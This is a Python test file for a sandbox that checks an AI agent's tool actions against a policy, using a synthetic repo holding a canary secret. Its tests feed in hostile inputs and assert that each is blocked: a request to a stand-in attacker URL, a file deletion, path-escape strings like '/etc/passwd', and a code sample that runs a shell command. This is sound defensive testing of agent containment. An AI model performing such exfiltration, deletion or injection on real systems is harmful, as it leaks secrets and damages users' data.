from app.demo_data import DEMO_POLICY
from app.models import Decision
from app.sandbox_runner import (
    AgentAction,
    CANARY,
    _fixture_files,
    _perform_action,
    _safe_relative_path,
    _safe_formatter_edit,
    run_sandbox_comparison,
)


class FakeSession:
    def __init__(self):
        self.calls = []

    def read(self, path):
        self.calls.append(("read", path))
        return CANARY

    def apply_files(self, *, files):
        self.calls.append(("write", files))


def action(tool, *, path="", content="", url=""):
    return AgentAction(tool=tool, path=path, content=content, url=url, message="")


def test_fixture_upload_contains_only_synthetic_files() -> None:
    files = _fixture_files()
    assert set(files) == {
        "/rulebranch/README.md",
        "/rulebranch/src/formatters.py",
        "/rulebranch/tests/test_formatters.py",
        "/rulebranch/.env",
    }
    assert files["/rulebranch/.env"] == CANARY
    assert b"NEBIUS_API_KEY" not in b"".join(files.values())


def test_invalid_paths_cannot_escape_fixture() -> None:
    for path in ("../.env", "src/../.env", "C:/secret", "/etc/passwd", "src//test.py", "src/./test.py"):
        assert _safe_relative_path(path) is None


def test_outer_safety_never_executes_network_or_delete() -> None:
    session = FakeSession()
    for candidate in (
        action("http_request", url="https://attacker.invalid/collect"),
        action("delete_file", path="src/formatters.py"),
    ):
        executed, _ = _perform_action(session, candidate, permitted=True)
        assert executed is False
    assert session.calls == []


def test_only_named_synthetic_source_can_be_written() -> None:
    session = FakeSession()
    assert _perform_action(session, action("write_file", path="README.md", content="x"), True)[0] is False
    source = 'def normalize_branch_name(value: str) -> str:\n    return " ".join(value.strip().split())\n'
    assert _perform_action(session, action("write_file", path="src/formatters.py", content=source), True)[0] is True
    assert session.calls == [("write", {"/rulebranch/src/formatters.py": source.encode()})]


def test_untrusted_source_cannot_invoke_import_or_network() -> None:
    assert _safe_formatter_edit('def normalize_branch_name(value):\n    return " ".join(value.strip().split())')
    assert not _safe_formatter_edit('import os\ndef normalize_branch_name(value):\n    return value')
    assert not _safe_formatter_edit('def normalize_branch_name(value):\n    return __import__("os").system("whoami")')
    assert not _safe_formatter_edit('def normalize_branch_name(value):\n    return value.__class__')


def test_policy_review_preflight_precedes_sandbox_access(monkeypatch) -> None:
    policy = DEMO_POLICY.model_copy(deep=True)
    policy.rules = [rule for rule in policy.rules if rule.id != "allow-tests"]
    monkeypatch.setattr("app.sandbox_runner.load_local_configuration", lambda: None)
    try:
        run_sandbox_comparison(policy)
    except ValueError as error:
        assert "18-case local matrix" in str(error)
    else:
        raise AssertionError("An unreviewed policy reached the Sandbox adapter")


def test_demo_policy_now_matches_its_no_delete_boundary() -> None:
    from app.policy_validation import validate_policy

    result = validate_policy(DEMO_POLICY)
    assert result.passed is True
    deletion = next(case for case in result.cases if case.id == "delete")
    assert deletion.actual == Decision.DENY
